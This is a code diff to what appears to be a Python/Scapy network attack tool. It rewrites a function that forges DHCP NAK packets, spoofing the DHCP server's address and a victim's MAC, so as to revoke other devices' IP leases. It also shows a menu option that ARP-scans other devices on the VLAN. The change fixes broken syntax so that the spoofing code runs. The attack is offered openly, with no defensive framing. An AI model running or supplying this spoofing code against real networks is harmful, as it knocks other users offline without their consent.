@@ -192,14 +192,32 @@ def forge_false_NACK(ip_address, number_of_times=1):
         print(f"MAC address for {ip_address} not found in bindings.")
         return
 
-    for _ in range(number_of_times):
-        packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
-                IP(src=DHCP_SERVER_IP_ADDRESS, dst="255.255.255.255") / \
-                UDP(sport=67, dport=68) / \
-                    bootp = BOOTP(op=2, yiaddr="0.0.0.0", chaddr=mac2str(mac_address), ciaddr=ip_address, xid=RandInt()) / \
-                    DHCP(options=[("message-type", "nak"), ("server_id", DHCP_SERVER_IP_ADDRESS), "end"])
-        sendp(packet, verbose=1)
-        print(f"Sent DHCP NACK for {ip_address} from {mac_address} to invalidate its IP address.")
+    for i in range(number_of_times):
+            # Create BOOTP and DHCP layers separately
+            bootp = BOOTP(
+                op=2,
+                yiaddr="0.0.0.0",
+                chaddr=mac2str(mac_address),
+                ciaddr=ip_address,
+                xid=RandInt()
+            )
+
+            dhcp = DHCP(options=[
+                ("message-type", "nak"),
+                ("server_id", DHCP_SERVER_IP_ADDRESS),
+                "end"
+            ])
+
+            # Construct full packet
+            packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
+                    IP(src=DHCP_SERVER_IP_ADDRESS, dst="255.255.255.255") / \
+                    UDP(sport=67, dport=68) / \
+                    bootp / dhcp
+
+            # Send packet
+            sendp(packet, verbose=1)
+            print(f"Sent DHCP NACK for {ip_address} from {mac_address} to invalidate its IP address.")
+
 
 def main():
     print_banner()
@@ -208,7 +226,7 @@ def main():
         choice = input(">> ").strip().upper()
         if choice == "S":
             print("Mapping TCP connections of other devices...")
-            arp_scan_dynamic()
+            arp_scan_dynamic()  
             print("ARP scan completed. Current DHCP bindings:")
             print_bindings()
             # Here you would implement the logic to map TCP connections by sending TCP ACK requests to other user devices found in the VLAN. From the TCP ACK they give back, find their MAC address and associated IP and map it in the dhcp_bindings dictionary.
